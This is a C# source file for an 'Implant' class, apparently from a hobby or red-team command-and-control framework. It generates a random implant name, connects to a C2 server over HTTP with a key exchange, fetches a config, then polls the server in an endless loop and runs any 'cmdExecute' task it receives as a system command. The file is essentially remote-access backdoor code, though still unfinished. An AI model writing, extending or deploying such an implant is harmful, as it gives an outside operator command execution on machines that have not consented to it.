using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;

namespace Implant
{
    class Implant
    {


        private CommunicationProviderInterface comprov;

        private string name;

        private Config config;

        public Implant(string c2Url)
        {
            //By Default we wait 5 sec between asking for stuff unless its update. Need to add some randomness in there but thats for later
            this.name = generateImplantName();


            this.comprov = new HTTPCommunicationProvider(c2Url, this.name);

            this.comprov.keyExchangeSetup();
            //Get config aka time between request + comm method. A bit weird to get comm method after I already interacted over HTTP but wtv todo lol
            this.config = this.comprov.getConfig();


            //This is where we pull new tasks and post the results
            while (true)
            {
                Thread.Sleep(this.config.pullInterval);
                Task task = this.comprov.getNextTask();
                if (task.taskName == "cmdExecute")
                {
                   var result = Modules.CmdExecute.cmdExecute(task.payload);
                }
                Thread.Sleep(this.config.pullInterval);
            }
        }

       
        private string generateImplantName()
        {
              Random random = new Random();
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, 10)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }



    }
}
